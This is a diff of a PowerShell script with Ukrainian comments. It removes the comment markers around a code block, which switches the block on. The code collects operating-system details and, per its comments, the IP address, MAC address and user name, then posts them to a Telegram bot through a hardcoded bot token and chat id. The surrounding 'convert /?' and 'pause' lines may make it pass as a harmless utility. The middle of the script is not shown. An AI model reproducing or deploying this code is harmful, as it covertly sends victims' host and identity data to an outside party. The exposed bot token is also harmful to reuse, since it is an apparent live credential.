@@ -1,7 +1,7 @@
 
 convert /?
 
-<# Отримуємо інформацію про операційну систему
+# Отримуємо інформацію про операційну систему
 $os = Get-CimInstance -ClassName Win32_OperatingSystem
 
 # Отримуємо IP-адресу, MAC-адресу та ім'я користувача
@@ -26,5 +26,5 @@ Invoke-RestMethod -Uri "https://api.telegram.org/bot7269680347:AAElwpxygcNsIQxcU
                   -ContentType "application/x-www-form-urlencoded" `
                   -Body @{chat_id="6039088675"; text=$message}
 
-#>
+
 pause
